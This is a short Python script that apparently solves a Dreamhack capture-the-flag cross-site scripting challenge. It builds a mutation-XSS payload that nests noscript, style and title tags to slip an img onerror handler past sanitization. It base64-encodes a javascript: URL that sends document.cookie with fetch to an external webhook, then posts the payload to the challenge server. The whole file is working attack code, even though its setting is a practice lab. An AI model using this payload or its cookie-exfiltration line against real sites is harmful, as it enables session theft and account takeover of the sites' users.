import requests
import base64

url = 'http://host8.dreamhack.games:15605/'

webhook = 'https://ubmtdsz.request.dreamhack.games'

exfil = "javascript:fetch(`%s?e=${document.cookie}`)" % webhook
js = 'location=atob`%s`' % base64.b64encode(exfil.encode()).decode().rstrip('=')

payload = '''<noscript><style><a title="</noscript><img src=x onerror=%s></style></noscript>''' % js

res = requests.post(f'{url}/flag', data={
    'param': payload
})

assert 'good' in res.text.lower()
print("> Payload submitted")